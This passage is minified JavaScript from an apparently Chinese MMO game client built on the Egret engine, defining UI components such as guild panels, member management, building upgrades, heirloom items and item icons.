0:t.selectedItem)||void 0===e?void 0:e.name)||"",this.dispatchEventWith(egret.Event.CHANGE)},e.prototype.removeDisplay=function(){this.stage&&this.removeTouchEvent(this.stage,this.onTap)},e.prototype.onTap=function(t){this.currentState="up"==this.currentState?"down":"up",t.stopPropagation(),this.stage&&("down"==this.currentState?this.addTouchEvent(this.stage,this.onTap):this.removeTouchEvent(this.stage,this.onTap))},e.prototype.setData=function(t){this.dataPro.replaceAll(t)},e.prototype.setSelectedIndex=function(t){this.selectedIndex=t,this.list&&(this.list.selectedIndex=t,this.listSelect())},e.prototype.getSelectedItem=function(){return this.list.selectedItem},e.prototype.getSelectedIndex=function(){return this.list.selectedIndex},e.prototype.setLabel=function(t){this.sVal=t},e.prototype.getLabel=function(){return this.value.text},e.prototype.setEnabled=function(t){this.touchEnabled=t,this.touchChildren=t},e}(n.BaseView);e.DropDown=s,window.DropDown=s,__reflect(s.prototype,"DropDown",[]);var a=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.prototype.dataChanged=function(){this.nameLbl.text=this.data.name},e}(o.BaseItemRender);e.DropDownListItem=a,window.DropDownListItem=a,__reflect(a.prototype,"DropDownListItem",[]),window.DropDown=s},function(t,e){},function(t,e){},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GuildInfoPanel=void 0;var n=i(1),o=i(4),s=i(28),a=i(147),r=i(1401),l=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="GuildInfoSkin",e.userGuild=s.Guild.ins(),e}return __extends(e,t),e.prototype.skinComplete=function(){this.list.itemRenderer=r.GuildMemberItem1Render,this.addTouchEvent(this.conBtn,this.onTap)},e.prototype.addDisplay=function(){observe(this,this.updateMyInfo,s.Guild.ins().postMyGuildInfo),observe(this,this.updateMember,s.Guild.ins().postGuildMembers),observe(this,this.updateRedPoint,s.Guild.ins().postConCount),this.list.dataProvider=this.aC=new eui.ArrayCollection([]),this.updateRedPoint(),this.updateMyInfo(),this.updateMember()},e.prototype.updateRedPoint=function(){this.redPoint.visible=a.GuildRP.ins().mtabDonate.v},e.prototype.onTap=function(t){switch(t.currentTarget){case this.conBtn:win.open("GuildConWin")}},e.prototype.updateMyInfo=function(){this.myCon.text=o.ActorCC.guildNum+""},e.prototype.updateMember=function(){this.aC.replaceAll(this.userGuild.getGuildMembers(1))},e.prototype.tabRp=function(){return a.GuildRP.ins().mtabDonate.v},e}(n.BaseView);e.GuildInfoPanel=l,window.GuildInfoPanel=l,__reflect(l.prototype,"GuildInfoPanel",[]),window.GuildInfoPanel=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GuildMemberItem1Render=void 0;var n=i(3),o=i(136),s=i(106),a=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.dataChanged=function(){this.data instanceof o.GuildMemberInfo&&(this.nameLab.text=this.data.name,this.office.text=s.GuildLanguage.guildOffice[this.data.office],this.conLab.text=this.data.contribution+"")},e}(n.BaseItemRender);e.GuildMemberItem1Render=a,window.GuildMemberItem1Render=a,__reflect(a.prototype,"GuildMemberItem1Render",[]),window.GuildMemberItem1Render=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GuildListPanel=void 0;var n=i(1),o=i(28),s=i(1403),a=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="GuildListSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.list.itemRenderer=s.GuildListItem2Render,o.Guild.ins().sendGuildList()},e.prototype.addDisplay=function(){observe(this,this.updateList,o.Guild.ins().postGuildList),this.list.dataProvider=this.aC=new eui.ArrayCollection([]),this.updateList()},e.prototype.updateList=function(){this.aC.replaceAll(o.Guild.ins().guildListInfos)},e}(n.BaseView);e.GuildListPanel=a,window.GuildListPanel=a,__reflect(a.prototype,"GuildListPanel",[]),window.GuildListPanel=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GuildListItem2Render=void 0;var n=i(3),o=i(212),s=i(0),a=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.dataChanged=function(){if(this.data instanceof o.GuildListInfo){var t=this.data,e=s.GlobalConfig.GuildConfig;if(t&&e){t.guildRank<4?(this.numImg.source="paihang"+t.guildRank,this.numLab.visible=!1,this.numImg.visible=!0):(this.numLab.text=t.guildRank+"",this.numLab.visible=!0,this.numImg.visible=!1),this.nameLab.textFlow=(new egret.HtmlTextParser).parser(t.guildName),this.member0.text=""+t.guildLevel,this.president.text=t.guildPresident;var i=t.commentLv,n=i?s.GlobalConfig.GuildConfig.affairMember[i-1]:0;this.member.text=t.guildMember+"/"+(e.maxMember[t.guildLevel-1]+n)}}},e}(n.BaseItemRender);e.GuildListItem2Render=a,window.GuildListItem2Render=a,__reflect(a.prototype,"GuildListItem2Render",[]),window.GuildListItem2Render=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GuildManagePanel=void 0;var n=i(1),o=i(159),s=i(28),a=i(147),r=i(1405),l=i(1406),h=i(2),u=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="GuildManageBuildSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.buildList.itemRenderer=r.GuildBuildItemRender,this.messageList.itemRenderer=l.GuildEventItenRender},e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=0!=s.Guild.ins().guildID;return i||h.TipsCT.ins().showTips(gettext("还未加入公会！")),i},e.prototype.addDisplay=function(){observe(this,this.updateList,s.Guild.ins().postUpBuilding),observe(this,this.update,s.Guild.ins().postManageList),observe(this,this.update,s.Guild.ins().postGuildMoney),s.Guild.ins().sendManageList(),this.updateList()},e.prototype.update=function(){this.messageList.dataProvider=new eui.ArrayCollection(s.Guild.ins().records)},e.prototype.updateList=function(){this.index=this.buildScroller.viewport.scrollV,this.buildList.dataProvider=new eui.ArrayCollection([o.GuildBuilding.GUILD_HALL,o.GuildBuilding.GUILD_COMMENT,o.GuildBuilding.GUILD_SHOP]),this.refushBar()},e.prototype.refushBar=function(){Timer.stop(this.refushBarList,this),Timer.start(100,1,this.refushBarList,this)},e.prototype.refushBarList=function(){Timer.stop(this.refushBarList,this),this.buildScroller.viewport.scrollV=this.index},e.prototype.tabRp=function(){return a.GuildRP.ins().mtabUp.v},e}(n.BaseView);e.GuildManagePanel=u,window.GuildManagePanel=u,__reflect(u.prototype,"GuildManagePanel",[]),window.GuildManagePanel=u},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GuildBuildItemRender=void 0;var n=i(3),o=i(28),s=i(107),a=i(2),r=i(159),l=i(0),h=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._maxLevel=0,e._curLevel=0,e._nextMoney=0,e}return __extends(e,t),e.prototype.createChildren=function(){this.upBtn.addEventListener(egret.TouchEvent.TOUCH_TAP,this.onTap,this)},e.prototype.onTap=function(){var t=this.data;return o.Guild.ins().myOffice<s.GuildOffice.GUILD_FUBANGZHU?void a.TipsCT.ins().showTips(gettext("仅会长可操作")):t==r.GuildBuilding.GUILD_HALL&&this._curLevel>=this._maxLevel?void a.TipsCT.ins().showTips(gettext("等级已满")):t!=r.GuildBuilding.GUILD_HALL&&this._curLevel>=o.Guild.ins().guildLv?void a.TipsCT.ins().showTips(gettext("请先升级管理大厅")):o.Guild.ins().money<this._nextMoney?void a.TipsCT.ins().showTips(gettext("资金不足")):void o.Guild.ins().sendUpBuilding(t)},e.prototype.dataChanged=function(){var t=this.data;this._curLevel=o.Guild.ins().getBuildingLevels(t-1)||0;var e=l.GlobalConfig.GuildLevelConfig[t],i=null,n=null;for(var s in e)if(e.hasOwnProperty(s)){var a=e[s];this._maxLevel=a.level>this._maxLevel?a.level:this._maxLevel,a.level==this._curLevel&&(i=a),a.level==this._curLevel+1&&(n=a)}if(i||n||t==r.GuildBuilding.GUILD_LIANGONGFANG||t==r.GuildBuilding.GUILD_SHOP){this.nameLab.text=l.GlobalConfig.GuildConfig.buildingNames[t-1],this.levelLab.text=gettext("等级 ")+(null==this._curLevel?0:this._curLevel),n&&this._curLevel<this._maxLevel?(this._nextMoney=n.upFund,this.upLevelLab.text=t==r.GuildBuilding.GUILD_HALL?"":gettext("升级要求：管理大厅达到{0}级",this._curLevel+1),this.money.text=o.Guild.ins().money+"/"+n.upFund,this.needMoney.text=gettext("需资金：{0}",n.upFund),this.progress.maximum=n.upFund,this.progress.value=o.Guild.ins().money,this.progress.visible=!0):(this.upLevelLab.text=gettext("等级已满"),i?this.money.text=o.Guild.ins().money+"/"+i.upFund:this.money.text=gettext("已满级"),this.needMoney.text="",this.progress.visible=!1);var h=l.GlobalConfig.GuildConfig.buildingTips[t-1];this.buildingLab.text=h,this.buildImg.visible=h.indexOf("\n")>-1}this.updateRedPoint()},e.prototype.updateRedPoint=function(){var t=this.data;return o.Guild.ins().myOffice<s.GuildOffice.GUILD_FUBANGZHU?void(this.redPoint.visible=!1):t==r.GuildBuilding.GUILD_HALL&&this._curLevel>=this._maxLevel?void(this.redPoint.visible=!1):t!=r.GuildBuilding.GUILD_HALL&&this._curLevel>=o.Guild.ins().guildLv?void(this.redPoint.visible=!1):o.Guild.ins().money<this._nextMoney?void(this.redPoint.visible=!1):void(this.redPoint.visible=!0)},e}(n.BaseItemRender);e.GuildBuildItemRender=h,window.GuildBuildItemRender=h,__reflect(h.prototype,"GuildBuildItemRender",[]),window.GuildBuildItemRender=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GuildEventItenRender=void 0;var n=i(3),o=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.dataChanged=function(){if("string"==typeof this.data){var t=this.data;t&&""!=t&&(this.info.text=t)}},e}(n.BaseItemRender);e.GuildEventItenRender=o,window.GuildEventItenRender=o,__reflect(o.prototype,"GuildEventItenRender",[]),window.GuildEventItenRender=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GuildMemberPanel=void 0;var n=i(1),o=i(106),s=i(107),a=i(28),r=i(27),l=i(1408),h=i(51),u=i(68),p=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="GuildMemberSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.list.itemRenderer=l.GuildMemberItemRender,this.dataArr=new eui.ArrayCollection,this.list.dataProvider=this.dataArr,this.addTouchEvent(this.quitBtn,this.onTap)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];observe(this,this.updateMyInfo,a.Guild.ins().postMyGuildInfo),observe(this,this.updateMember,a.Guild.ins().postGuildMembers),this.updateMyInfo(),this.updateMember()},e.prototype.updateMember=function(){var t=a.Guild.ins().getGuildMembers(1);this.dataArr.replaceAll(t)},e.prototype.onTap=function(t){switch(t.currentTarget){case this.quitBtn:if(h.GuildBattleCT.ins().getModel().isWatStart)return void r.WarnWin.show(gettext("沙城争霸战期间,不允许退出公会"),function(){},this);if(u.CrossDartCarCT.ins().checkStopGuildOp())return;if(a.Guild.ins().myOffice==s.GuildOffice.GUILD_BANGZHU&&a.Guild.ins().getMemberNum()>1)return void r.WarnWin.show(gettext("需要先进行禅让，才可退出行会"),function(){},this);r.WarnWin.show(gettext("是否确定退出公会。\n公会技能继续生效。"),function(){a.Guild.ins().sendQuitGuild()},this,null,null,"normal","center")}},e.prototype.updateMyInfo=function(){this.office.text=o.GuildLanguage.guildOffice[a.Guild.ins().myOffice],this.totalCon.text=a.Guild.ins().myTotalCon+""},e}(n.BaseView);e.GuildMemberPanel=p,window.GuildMemberPanel=p,__reflect(p.prototype,"GuildMemberPanel",[]),window.GuildMemberPanel=p},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GuildMemberItemRender=void 0;var n=i(3),o=i(173),s=i(27),a=i(136),r=i(0),l=i(4),h=i(28),u=i(2),p=i(107),d=i(106),c=i(7),f=i(8),g=i(5),m=i(44),v=i(51),y=i(68),C=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.skinComplete=function(){var t=this;this.addTouchEvent(this,this.onTap),this.hasEventListener(egret.Event.REMOVED_FROM_STAGE)||this.addEventListener(egret.Event.REMOVED_FROM_STAGE,function(){delMsg(t)},this),this.addEventListener(egret.TouchEvent.TOUCH_TAP,function(e){var i;e.target instanceof eui.Button||(null===(i=t.data)||void 0===i?void 0:i.roleID)&&m.ReadPlayerCT.ins().sendFindPlayer(t.data.roleID)},this)},e.prototype.onTap=function(t){if(o.GuildWar.ins().getModel().isWatStart)return void s.WarnWin.show(gettext("沙城争霸战期间,不允许禅让/降职/任命副会长/踢出操作"),function(){},this);if(!y.CrossDartCarCT.ins().checkStopGuildOp()){var e=this.data,i=e.roleID;switch(t.target){case this.impeachBtn:s.WarnWin.show(gettext("是否消耗{0}元宝弹劾会长？（弹劾后成为会长）",r.GlobalConfig.GuildConfig.impeachCost),function(){l.ActorCC.yb>=r.GlobalConfig.GuildConfig.impeachCost?h.Guild.ins().sendDemise():u.TipsCT.ins().showTips(gettext("元宝不足"))},this);break;case this.demiseBtn:s.WarnWin.show(gettext("是否禅让会长职位给[{0}]",e.name),function(){h.Guild.ins().sendChangeOffice(i,p.GuildOffice.GUILD_BANGZHU)},this);break;case this.downBtn:s.WarnWin.show(gettext("是否免除[{0}]副会长之职",e.name),function(){h.Guild.ins().sendChangeOffice(i,p.GuildOffice.GUILD_MEMBER)},this);break;case this.kickBtn:if(v.GuildBattleCT.ins().getModel().isWatStart)return void s.WarnWin.show(gettext("沙城争霸期间,不允许把成员踢出公会"),function(){},this);s.WarnWin.show(gettext("确定将[{0}]踢出公会？",e.name),function(){h.Guild.ins().sendKick(i)},this);break;case this.appointBtn:s.WarnWin.show(gettext("确定任命[{0}]为副会长？",e.name),function(){h.Guild.ins().canAppointFHZ()?h.Guild.ins().sendChangeOffice(i,p.GuildOffice.GUILD_FUBANGZHU):u.TipsCT.ins().showTips(gettext("副会长人数已达上限"))},this)}}},e.prototype.dataChanged=function(){if(this.data instanceof a.GuildMemberInfo){var t=this.data;this.nameLab.textFlow=(new egret.HtmlTextParser).parser("["+d.GuildLanguage.guildOffice[t.office]+"]<font color='#DFDCDC'>"+t.name+"</font>"),this.conLab.text=t.contribution+"",this.attack.text=t.attack+"",this.job.source="yuanhead"+t.job+t.sex;var e=0,i=h.Guild.ins().myOffice;switch(t.downTime>0?(e=.001*(c.GameServerCC.serverTime-f.DateUtils.formatMiniDateTime(t.downTime)),this.onLine.textFlow=g.TextFlowMaker.generateTextFlow1("|C:0xf3311e&T:"+f.DateUtils.getFormatBySecond(e,7))):this.onLine.textFlow=(new egret.HtmlTextParser).parser(gettext("<font color='#13CE0C'>在线</font>")),this.group1.visible=!1,this.group2.visible=!1,this.group3.visible=!1,this.impeachBtn.visible=e>=432e3,i){case p.GuildOffice.GUILD_BANGZHU:if(t.office==p.GuildOffice.GUILD_BANGZHU)break;t.office==p.GuildOffice.GUILD_FUBANGZHU?this.group2.visible=!0:(this.group3.visible=!0,this.appointBtn.visible=!0);break;case p.GuildOffice.GUILD_FUBANGZHU:if(t.office==p.GuildOffice.GUILD_BANGZHU)this.group1.visible=!0;else{if(t.office==p.GuildOffice.GUILD_FUBANGZHU)break;this.group3.visible=!0,this.appointBtn.visible=!1}break;case p.GuildOffice.GUILD_ZHANGLAO:case p.GuildOffice.GUILD_HUFA:case p.GuildOffice.GUILD_TANGZHU:t.office==p.GuildOffice.GUILD_BANGZHU&&(this.group1.visible=!0)}}},e}(n.BaseItemRender);e.GuildMemberItemRender=C,window.GuildMemberItemRender=C,__reflect(C.prototype,"GuildMemberItemRender",[]),window.GuildMemberItemRender=C},function(t,e){},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.HeirloomItem=void 0;var n=i(3),o=i(0),s=i(31),a=function(t){function e(){var e=t.call(this)||this;return e._sn_="heirloomItemSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){"boolean"==typeof this._isSelect&&this.setSelect(this._isSelect),"boolean"==typeof this._red&&this.setSelectIconVisible(this._red),"boolean"==typeof this._tipsVis&&this.setTipsVisible()},e.prototype.dataChanged=function(){if(this.clear(),this.data){this.setSelect(this._isSelect);var t=this.data.info;this.itemIcon.setData(t,this.data.pos,this.data.icon),this.itemIcon.effect&&this.addChildAt(this.itemIcon.effect,this.getChildIndex(this.selectIcon)),this.lv.visible=!!t,t&&t.lv>0?(this.lv.visible=!0,this.lv.source="heir_0"+t.lv):this.lv.visible=!1;var e=o.GlobalConfig.HeirloomEquipConfig[this.data.pos+1][1];this.equipName.text=t&&t.lv>0?t.name:e.name,this.equipName.textColor=t&&t.lv>0?s.QUALITY_COLOR[5]:14668213,this.updateRp()}},e.prototype.setSelect=function(t){this._isSelect=t,this.selectIcon&&(this.selectIcon.visible=t)},e.prototype.setRed=function(t){this._red=t,this.updateRp()},e.prototype.updateRp=function(){this.redPoint&&(this.redPoint.visible=this._red)},e.prototype.cleanEff=function(){this.itemIcon&&this.itemIcon.cleanEff()},e.prototype.setTipsVisible=function(){this._tipsVis=!1,this.skin&&(this.itemIcon.setRectVis(this._tipsVis),this.equipName.visible=this._tipsVis)},e.prototype.clear=function(){this.cleanEff()},e.prototype.setSelectIconVisible=function(t){var e,i;if(this.itemIcon){var n=this.itemIcon.y;(null===(i=null===(e=this.itemIcon)||void 0===e?void 0:e.imgRect)||void 0===i?void 0:i.visible)||(n=this.itemIcon.y-1),this.selectIcon.y=n}},e.QUALITY_COLOR=[14868436,3532333,13779707,16741647,15937822,16767295],e}(n.BaseItemRender);e.HeirloomItem=a,window.HeirloomItem=a,__reflect(a.prototype,"HeirloomItem",[]),window.HeirloomItem=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.HeirloomItemIcon=void 0;var n=i(21),o=i(16),s=function(t){function e(){var e=t.call(this)||this;return e.showIcon=[0,1,2,3,4,8,9,6,5,7],e._sn_="heirloomItemIcon",e}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.info&&this.setData(this.info,this.pos,this.icon)},e.prototype.setRectVis=function(t){},e.prototype.setData=function(t,e,i){return this.info=t,this.pos=e,this.icon=i,this.skin?null!=t&&((i||t.icon)&&(this.imgIcon.source=RES_DIR_ITEMICON+(i?i:t.icon)+".png"),t.lv>0)?(null==this.effect&&(this.effect=new n.MovieClip,this.effect.x=this.width/2,this.effect.y=this.height/2,this.addChildAt(this.effect,this.getChildIndex(this.imgIcon)+1)),this.effect.playFile(RES_DIR_EFF+"ValueEff5",-1),void(this.imgBg.source="quality5")):void(i||(this.imgBg.source="quality0",this.imgIcon.source="xb_1"+this.showIcon[e])):void 0},e.prototype.cleanEff=function(){this.effect&&(o.DisplayUtils.removeFromParent(this.effect),this.effect=null)},e}(eui.Component);e.HeirloomItemIcon=s,window.HeirloomItemIcon=s,__reflect(s.prototype,"HeirloomItemIcon",[]),window.HeirloomItemIcon=s},function(t,e){},function(t,e){var i=function(t){function e(){var e=t.call(this)||this;return e._interval=0,e.showNum=0,e._type=1,e.imgArr=[],e}return __extends(e,t),e.prototype.destroy=function(){for(var t=0,e=this.imgArr;t<e.length;t++){var i=e[t];i.parent&&i.parent.removeChild(i),i.source=null}this.imgArr=null,this.source=null},e.prototype.clear=function(){for(var t=0,e=this.imgArr;t<e.length;t++){var i=e[t];i.parent&&(i.parent.removeChild(i),i.source=null)}this.imgArr.length=0,this._interval=0,this.showNum=0,this._type=1,this.source=null},Object.defineProperty(e.prototype,"type",{get:function(){return this._type},set:function(t){this._type=t,this.reset()},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"imgSource",{get:function(){return this.source},set:function(t){this.source=t},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"imgNum",{get:function(){return this.showNum},set:function(t){this.showNum=t,this.removeChildren();for(var e=0;e<this.showNum;e++){var i=this.imgArr[e];i||(i=new eui.Image,this.imgArr.push(i),i.addEventListener(egret.Event.COMPLETE,this.loaded,this)),i.source=this.source,this.addChild(i)}this.reset()},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"interval",{get:function(){return this._interval},set:function(t){this._interval=t,this.reset()},enumerable:!1,configurable:!0}),e.prototype.reset=function(){CallLater.callLater(this._reset,this)},e.prototype._reset=function(){for(var t=0;t<this.showNum;t++){var e=this.imgArr[t];1==this._type?(e.y=0,e.x=t*(this._interval+e.width)):(e.x=0,e.y=t*(this._interval+e.height))}},e.prototype.loaded=function(t){this.reset()},e}(eui.Component);window.ImageArray=i,__reflect(i.prototype,"ImageArray",["IDestroy","IPoolElement"])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ItemBaseEff4=void 0;var n=i(11),o=i(36),s=i(10),a=i(39),r=i(0),l=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.prototype.showEquipEffect=function(){if(this.itemConfig||this.data.id==o.MoneyConst.yuanbao){var t=s.ItemUtil.getType(this.itemConfig),e="ValueEff4";if(this.addChildAt(this.EquipEffect,this.getChildIndex(this.redPoint)),t==a.ItemType.TYPE_26){var i=r.GlobalConfig.LeitingEquipConf[this.itemConfig.id];i&&(this.equipStar||(this.equipStar=new eui.Image,this.addChild(this.equipStar),this.equipStar.left=5,this.equipStar.top=0),this.equipStar.source="leit"+i.level+"x")}this.EquipEffect.data=RES_DIR_EFF+e}},e}(n.ItemBase);e.ItemBaseEff4=l,window.ItemBaseEff4=l,__reflect(l.prototype,"ItemBaseEff4",[]),window.ItemBaseEff4=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ItemBaseNoEff=void 0;var n=i(11),o=function(t){function e(){var e=t.call(this)||this;return e.EquipEffect&&(e.EquipEffect.visible=!1),e}return __extends(e,t),e}(n.ItemBase);e.ItemBaseNoEff=o,window.ItemBaseNoEff=o,__reflect(o.prototype,"ItemBaseNoEff",[]),window.ItemBaseNoEff=o},function(t,e){},function(t,e){},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ItemIcon=void 0;var n=i(3),o=i(10),s=i(13),a=i(6),r=i(16),l=i(0),h=i(24),u=i(38),p=i(34),d=i(39),c=i(99),f=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.Jp_Count=3,e.Jp_NeedQx=4,e._tag="",e._iconStr="",e}return __extends(e,t),e.prototype.skinComplete=function(){this.setTag(this._tag),this.effGrp&&this.effGrp.removeChildren(),this.setData(this.config,this.cfgData),!!this._imgbgstr&&this.setImgBg2(this._imgbgstr),!!this._imgEffstr&&this.setItemEff2(this._imgEffstr),this.updateImgJob(),"boolean"==typeof this._showExtreme&&this.isShowExtreme(this._showExtreme),this._heirloomDic&&this.setItemHeirloomBgImg(this._heirloomDic.show,this._heirloomDic.path),!!this.itemCfg&&this.setCfg(this.itemCfg,this.noShow),this.iconEffect.touchEnabled=this.iconjp4Effect.touchEnabled=this.iconSoulEffect.touchEnabled=!1},e.prototype.setTag=function(t){this._tag=t,this.tag&&(t&&""!=t?(this.tag.visible=!0,this.tag.source=t):this.tag.visible=!1)},e.prototype.removeDisplay=function(){this.eff=null,this.tisheng&&egret.Tween.removeTweens(this.tisheng)},e.prototype.playTisheng=function(){this.tisheng.visible=!0,this.tisheng.verticalCenter=0,egret.Tween.get(this.tisheng,{loop:!0}).to({verticalCenter:-10},500).to({verticalCenter:0},500)},e.prototype.setData=function(t,e){var i,n;if(this.config=t,this.cfgData=e,this.skin){if(null!=t){var a=l.GlobalConfig.ItemDescConfig[t.descIndex],r=t.icon;if(o.ItemUtil.getType(t)==d.ItemType.TYPE_55&&this.cfgData){var h=this.cfgData.getPrefixId();if(this.cfgData.handle>0&&h){var p=l.GlobalConfig.GemPrefixConfig[h];p&&p.icon&&(r=p.icon)}var f=e.getGemLv();e.treasureData&&(f=e.treasureData.gemQlt),this.imgBg.source="quality"+f}else{var g=this.cfgData?(null===(i=this.cfgData)||void 0===i?void 0:i.quality)||0:(null===a||void 0===a?void 0:a.quality)||0;g>=0&&(this.imgBg.source="quality"+g)}if(e&&e.treasureData&&(r=e.treasureData.iconUrl),this.setIcon(r),this.setStarInfo(null===(n=this.cfgData)||void 0===n?void 0:n.star),this.tisheng.visible=!1,e&&(o.ItemUtil.isEquip(t)||o.ItemUtil.isMasterEquip(t))){if(e.isMyEquip()){var m=s.SubRoles.ins().getSubRoleByIndex(0);!m.isWearEquip(e.handle)&&u.EquipCT.ins().checkEquipIsCanWear(t.id,e)&&this.itemCanUp(e)}}else if(o.ItemUtil.getType(t)==d.ItemType.TYPE_16&&this.cfgData){var v=l.GlobalConfig.GodWingItemConfig[t.id];if(v&&!c.WingCC.checkGodWingLevel(0,v.itemId)){var y=c.WingCC.getGodWing(0).getLevel(v.slot);v.level>y&&this.playTisheng()}}}else this.setIcon(this._iconStr),this.imgBg.source="quality0",this.setStarInfo(0),this.tisheng.visible=!1,egret.Tween.removeTweens(this.tisheng);this.updateStaticDec(),this.showIconEffect(),this.showSoulEffect(),this.showItemEffect()}},e.prototype.setStarInfo=function(t){for(;this.starGroup.numChildren>0;)this.starGroup.removeChildAt(0);for(var e,i=0;t>i;i++)e=new eui.Image,e.source="star0",this.starGroup.addChild(e)},e.prototype.itemCanUp=function(t,e){var i=a.BagCT.ins().getEquipAttrs(t),n=t.point?t.point:o.ItemUtil.getAttrPower(i);if(e){var r=a.BagCT.ins().getEquipAttrs(e),l=o.ItemUtil.getAttrPower(r);return void(n>l&&this.playTisheng())}var u=s.SubRoles.ins().getSubRoleByIndex(0),p=t.itemConfig,d=o.ItemUtil.getSubType(p);if(o.ItemUtil.isMasterEquip(p)){var c=u.getMasterEquipByIndex(d);(!c||c.point<n)&&this.playTisheng()}else{var f=h.CommonUtils.copyDataHandler(o.ItemUtil.getPosList(p)||[]);-1==f.indexOf(d)&&f.push(d);for(var g=0;g<f.length;g++){var m=f[g],v=u.getEquipByIndex(m);if(v&&v.item&&v.item.itemConfig){var y=a.BagCT.ins().getEquipAttrs(v.item),l=v.item.point?v.item.point:o.ItemUtil.getAttrPower(y);n>l&&this.playTisheng()}else this.playTisheng()}}},e.prototype.isShowExtreme=function(t){this._showExtreme=t,this.extreme&&(this.extreme.visible=t)},e.prototype.setItemHeirloomBgImg=function(t,e){this.skin&&(!this._heirloomDic&&(this._heirloomDic={}),this._heirloomDic.show=t,this._heirloomDic.path=e,this.imgheirloom||(e&&(this.imgheirloom.source=e+"_png"),this.imgheirloom.visible=t))},e.prototype.setIcon=function(t){var e=t;"number"==typeof e&&(e=RES_DIR_ITEMICON+t+".png"),this._iconStr=e,this.imgIcon&&(this.imgIcon.source=e)},e.prototype.setImgBg2=function(t){this._imgbgstr=t,this.imgBg&&(this.imgBg.visible=!!t,this.imgBg.source=t?t:"")},e.prototype.getIcon=function(){return this.imgIcon},e.prototype.setCfg=function(t,e){this.itemCfg=t,this.noShow=e,this.skin&&(this.config=t,this.updateStaticDec(e))},e.prototype.updateStaticDec=function(t){var e;for(void 0===t&&(t=!0),this.eStaticGrp.visible=t;this.eStaticGrp.numChildren>0;){var i=this.eStaticGrp.getChildAt(0);delete i.top,delete i.bottom,delete i.right,delete i.left,r.DisplayUtils.removeFromParent(i)}if(null===(e=this.config)||void 0===e?void 0:e.decParam){var n=this.config.decParam.length,o=this.config.decParam[0],s=l.GlobalConfig.ItemStaticDecConfig[o];if(s)for(var a=1;n>a;a++){var h=s["pos"+a];if(h){var i=this[h.name];if(i){this.eStaticGrp.addChild(i);var u=h.pos;for(var p in u)i[p]=u[p];i instanceof eui.BitmapLabel&&(i.text=this.config.decParam[a])}}}}},e.prototype.isJp3=function(){var t,e;if(this.config&&this.config.effName)return!0;for(var i=0,n=0;n<(null===(e=null===(t=this.cfgData)||void 0===t?void 0:t.supExtAtt)||void 0===e?void 0:e.length);n++){var o=this.cfgData.supExtAtt[n].type;if(o!=p.AttributeType.atAtkMax&&o!=p.AttributeType.atAtkMageMax&&o!=p.AttributeType.atAtkTaoistMax&&o!=p.AttributeType.atRes){var s=this.cfgData.supExtAttQuality[n];s&&s>=this.Jp_NeedQx&&i++}}if(i>=this.Jp_Count)return!0;if(this.config&&l.GlobalConfig.EquipConfig[this.config.id]){var a=l.GlobalConfig.EquipConfig[this.config.id];if(a&&a.fixedAffixAttr){i=0;for(var r in a.fixedAffixAttr){var h=a.fixedAffixAttr[r],o=h[0];if(o!=p.AttributeType.atAtkMax&&o!=p.AttributeType.atAtkMageMax&&o!=p.AttributeType.atAtkTaoistMax&&o!=p.AttributeType.atRes){var s=h[2];s&&s>=this.Jp_NeedQx&&i++}}if(i>=this.Jp_Count)return!0}}return!1},e.prototype.showIconEffect=function(){var t;if(this.skin)if((null===(t=this.cfgData)||void 0===t?void 0:t.getJPNum())?(this.addChildAt(this.iconEffect,this.getChildIndex(this.imgIcon)-1),this.iconEffect.data=RES_DIR_EFF+"jipinEquip"):r.DisplayUtils.removeFromParent(this.iconEffect),this.isJp3()){this.addChildAt(this.iconjp4Effect,this.getChildIndex(this.imgIcon)-1);var e=0;if(this.cfgData?e=this.cfgData.quality:this.config&&(e=o.ItemUtil.getQuality2(this.config)),this.config&&this.config.effName)var i=this.config.effName;var n=i?i:"ValueEff"+e;this.iconjp4Effect.data=RES_DIR_EFF+n}else r.DisplayUtils.removeFromParent(this.iconjp4Effect)},e.prototype.showSoulEffect=function(){for(var t,e,i,n=(null===(e=null===(t=this.cfgData)||void 0===t?void 0:t.extAttQuality)||void 